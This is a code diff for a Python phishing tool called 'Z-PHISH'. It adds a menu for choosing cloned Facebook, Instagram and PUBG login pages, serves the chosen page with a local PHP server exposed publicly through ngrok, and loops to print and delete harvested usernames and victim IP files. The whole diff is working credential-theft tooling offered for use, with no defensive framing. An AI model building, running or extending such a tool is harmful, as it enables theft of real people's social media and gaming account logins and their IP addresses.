@@ -36,17 +36,58 @@ else:
     print("First Singup The https://ngrok.com/ and get the authtoken ")
     token = input("Please enter key only \nEnter authtoken: ")
     os.system(f"ngrok authtoken {token}")
+def start(site):
+    os.system("ngrok http 5555 > /dev/null 2>&1 &")
+    print(f'{Fore.YELLOW}\n[+] Starting PHP Server...')
+    time.sleep(3)
+    os.system(f"php -S localhost:5555 -t server/{site} > /dev/null 2>&1 & ")
+    get_ngrok_url()
 
-os.system("ngrok http 5555 > /dev/null 2>&1 &")
-time.sleep(3)
-os.system("php -S localhost:5555 > /dev/null 2>&1 & ")
-get_ngrok_url()
-print(f'{Fore.GREEN}\n[+] Link: {a}')
-print(f'{Fore.YELLOW}\n[+] Please Wait.....')
+    print(f'{Fore.GREEN}\n[+] Link: {a}')
+    print(f'{Fore.YELLOW}\n[+] Please Wait.....')
+    while True:
+        if os.path.isfile(f'server/{site}/usernames.txt'):
+            print(f'{Fore.GREEN}\n[*] User Found! {Fore.WHITE}')
+            os.system(f"cat server/{site}/usernames.txt")
+            os.system(f"rm -rf server/{site}/usernames.txt")
+            print(f"{Fore.CYAN}="*50)
+        if os.path.isfile(f'server/{site}/ip.txt'):
+            print(f'{Fore.GREEN}\n[!] IP Found!{Fore.WHITE}')
+            os.system(f"cat server/{site}/ip.txt")
+            os.system(f"rm -rf server/{site}/ip.txt")
+            print(f"{Fore.CYAN}="*50)
 
-while True:
-    if os.path.isfile('usernames.txt'):
-        print(f'{Fore.GREEN}\n[*] User Found!')
-        os.system(f"cat usernames.txt")
-        os.system(f"rm -rf usernames.txt")
-        print(f'{Fore.YELLOW} ='*40)
+def slect():
+    os.system("clear")
+    os.system("figlet Z-PHISH | lolcat")
+    print(f"""{Fore.CYAN}
+    [1] Facebook   [2] PUBG
+
+    [3] Instagram  [0] Exit
+    """)
+    choo = int(input('\nEnter Number:  '))
+    if choo == 1:
+        print("[1] Facebook")
+        print("[2] Facebook_security")
+        a = int(input("\nEnter Number : "))
+        if a == 1:
+          site = "facebook"
+          start(site)
+        elif a == 2:
+            site = "fb_security"
+            start(site)
+        else:
+            slect()
+    elif choo == 2:
+        site = "pubg"
+        start(site)
+    elif choo == 3:
+        site ="instagram"
+        start(site)
+    elif choo == 0:
+        exit()
+    else:
+        print(f'{Fore.RED}\n[!] Error Invalit Number!')
+        time.sleep(2)
+        slect()
+slect()
